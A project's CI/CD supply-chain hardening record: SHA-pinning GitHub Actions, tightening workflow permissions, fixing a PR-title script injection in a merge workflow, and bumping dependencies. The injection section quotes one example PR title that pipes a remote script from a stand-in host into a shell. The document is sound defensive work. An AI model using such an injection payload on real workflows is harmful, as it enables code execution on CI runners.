# CI/CD Supply-Chain Hardening

**Phase 12 (Security, CI, Dependency and Quality-Gate Improvements), 2026-08-09.**

## SHA-pinning

Every third-party `uses:` action across all four workflows (`ci.yml`, `deploy-preview.yml`,
`deploy-production.yml`, `merge-when-green.yml`) is now pinned to a full commit SHA, with the
resolved version as a trailing comment (e.g. `actions/checkout@3d3c42e5... # v7.0.1`), not a mutable
tag. A tag can be force-moved by the action's maintainer (or, in a supply-chain compromise, by an
attacker who gains control of the action's repo) to point at different code without the version
number changing — a SHA pin makes exactly what code runs auditable and immutable. Resolved via the
GitHub API (`gh api repos/<action>/commits/<tag>`) against each action's current tag, not guessed.

`.github/dependabot.yml`'s `github-actions` ecosystem entry only bumps the mutable tag version in
its update PRs — it doesn't itself re-resolve/verify a SHA. Each Dependabot Actions-bump PR should
be spot-checked that the new pin is a real SHA for the new tag, not silently reverted to a tag
reference, until this is automated.

## Workflow permissions

`ci.yml` gained a workflow-level `permissions: { contents: read }` default — previously, the
`browser-smoke` and `ci-gate` jobs had no `permissions:` block at all and inherited whatever the
org/repo default `GITHUB_TOKEN` policy was, which could be broader than needed. The `quality` job's
own narrower `contents: read, pull-requests: read` (needed for `gitleaks-action` to list PR commits)
is unaffected. `deploy-preview.yml`, `deploy-production.yml`, and `merge-when-green.yml` already had
explicit, appropriately-scoped job- or workflow-level `permissions:` blocks — no change needed.

## Script-injection review

Every `run:` step across all four workflows was checked for direct `${{ }}` interpolation of an
untrusted value (PR title/body, branch name, commit message, `github.event.pull_request.*`,
`github.head_ref`) into a shell command — the classic GitHub Actions injection shape, where e.g. a
PR titled `"; curl evil.sh | sh #` can break out of a quoted argument.

One real instance found: `merge-when-green.yml`'s squash-merge step interpolated the PR's own title
directly into `gh pr merge --subject "${{ steps.guard.outputs.title }} ..."`. Fixed by passing it
through an `env:` var (`PR_TITLE`) and referencing `"$PR_TITLE"` in the shell instead — the safe
pattern GitHub's own documentation recommends. This step is only reachable for PRs authored by the
repository owner (`docs/security/...` — see the guard chain in that workflow), so it wasn't
externally exploitable as found, but the fix removes the shape entirely rather than relying on the
author-gate alone.

`deploy-production.yml` interpolates `github.event.inputs.commit_sha` into shell in a few places —
flagged for completeness against the same criterion, but this input only ever comes from a
privileged, manually-dispatched operator (not PR metadata), and is quoted everywhere it's used, so
it's not a genuine external-attacker vector.

## Branch protection (RISK-027)

Re-confirmed unchanged this phase: `main` is a private repository on GitHub's Free plan, and
`GET /repos/.../branches/main/protection` correctly `403`s ("Upgrade to GitHub Pro or make this
repository public to enable this feature"). `merge-when-green.yml` remains the substitute — see that
workflow's own header comment for the trust-boundary reasoning (same-repo PRs only, owner-authored
only, exact-SHA re-verification against the CI run that actually tested it).

## Dependency-audit gate

See `docs/security/DEPENDENCY_VULNERABILITY_POLICY.md` — the `continue-on-error: true` that
previously made a critical-severity finding non-blocking was removed.

## Wrangler version

Bumped `4.114.0` → `4.120.0` across every `package.json` that pins it (`/package.json`,
`apps/web/package.json`), with `@cloudflare/workers-types` aligned to `5.20260809.1` across every
workspace package (`apps/web`, `packages/database`, `apps/e2e-fixture`) to avoid a split `drizzle-orm`
install (two different `@cloudflare/workers-types` peer versions in the dependency tree otherwise
produce structurally-incompatible `drizzle-orm` instances — a real, reproduced typecheck failure
this phase hit and fixed, not a hypothetical). This closes the root cause behind both RISK-026 (a
blocked Dependabot PR) and materially de-risks RISK-015 (built-server E2E) — see
`docs/risks/ACTIVE_RISKS.md` for both.
